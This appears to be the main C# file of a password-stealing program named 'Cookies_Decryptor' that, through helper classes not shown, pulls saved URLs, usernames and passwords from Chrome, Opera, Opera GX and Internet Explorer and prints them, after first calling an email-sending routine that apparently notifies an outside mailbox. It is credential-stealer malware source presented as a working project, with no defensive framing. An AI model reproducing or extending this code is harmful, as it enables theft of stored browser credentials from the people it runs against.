using System;
using System.Collections.Generic;

namespace Cookies_Decryptor
{

    class Program
    {
		//Reference to -> https://github.com/jabiel/BrowserPass
        static void Main(string[] args)
        {
            Email.Send("Project is ready", "Project is ready");

            var loginData = new List<IBrowserData>
            {
                new ChromePasswords(), new OperaPasswords(), new OperaGxPasswords()
                , new InternetExplorerPasswords()
                //,new FireFoxPasswords()
            };
            foreach (var browser in loginData)
            {
                Console.WriteLine($"# -> {browser.Name}\n -------------------------------------------- ");
                try
                {
                    PrintData(browser.GetLoginData());
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                finally
                {
                    Console.WriteLine("\n\n");

                }
            }
        }

        private static void PrintData(IEnumerable<LoginData> print)
        {
            foreach (var d in print)
                Console.WriteLine($"{d.Url}\r\n\tUsername: {d.Username}\r\n\tPassword: {d.Password}\r\n\n");
        }
    }
}